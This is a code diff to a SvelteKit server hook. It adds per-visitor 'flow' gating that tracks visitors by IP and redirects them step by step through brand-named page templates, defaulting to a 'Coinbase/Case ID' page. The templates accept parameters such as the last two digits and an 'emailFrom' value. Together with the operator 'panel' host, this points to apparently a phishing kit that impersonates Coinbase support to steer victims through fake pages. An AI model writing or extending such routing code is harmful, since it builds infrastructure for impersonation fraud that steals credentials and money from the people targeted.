@@ -8,6 +8,13 @@ import { resolveVisitorTemplate } from '$lib/server/visitorRouter.js';
 import { getFlowLandingPath } from '$lib/server/funnel.js';
 import { loadTemplateHtml } from '$lib/server/visitorTemplates.js';
 import { serverState } from '$lib/server/state.js';
+import {
+	isStepAllowed,
+	resolveNextStep,
+	markStepInProgress,
+	ensureFlowInitialized,
+	flowStepToUrl
+} from '$lib/server/goldenFlow.js';
 import type { Server } from 'node:http';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').trim().toLowerCase();
@@ -103,6 +110,31 @@ export const handle: Handle = async ({ event, resolve }) => {
 
 		const tpl = resolveVisitorTemplate(domain.module, path);
 		if (tpl) {
+			const visitorIp = event.getClientAddress();
+			const visitor = visitorIp ? serverState.visitors.get(visitorIp) : undefined;
+
+			if (visitor && !visitor.flowBypassed) {
+				ensureFlowInitialized(visitor);
+
+				if (visitor.flowSteps.length > 0) {
+					const requestedLabel = `${tpl.brand}/${tpl.page}`;
+					if (!isStepAllowed(visitor.flowSteps, requestedLabel)) {
+						const nextLabel = resolveNextStep(visitor.flowSteps);
+						if (nextLabel) {
+							const redirectUrl = flowStepToUrl(nextLabel, domain.module);
+							if (redirectUrl && redirectUrl !== path) {
+								return new Response(null, {
+									status: 302,
+									headers: { Location: redirectUrl }
+								});
+							}
+						}
+					} else {
+						markStepInProgress(visitor, `${tpl.brand}/${tpl.page}`);
+					}
+				}
+			}
+
 			const html = loadTemplateHtml(tpl.brand, tpl.page, {
 				lastTwoDigits: event.url.searchParams.get('last2') || undefined,
 				emailFrom: event.url.searchParams.get('emailFrom') || undefined,
@@ -125,6 +157,9 @@ export const handle: Handle = async ({ event, resolve }) => {
 			if (flowLanding) {
 				landingRedirect = flowLanding;
 			}
+		} else {
+			const goldenLanding = flowStepToUrl('Coinbase/Case ID', domain.module);
+			if (goldenLanding) landingRedirect = goldenLanding;
 		}
 		return new Response(null, {
 			status: 302,
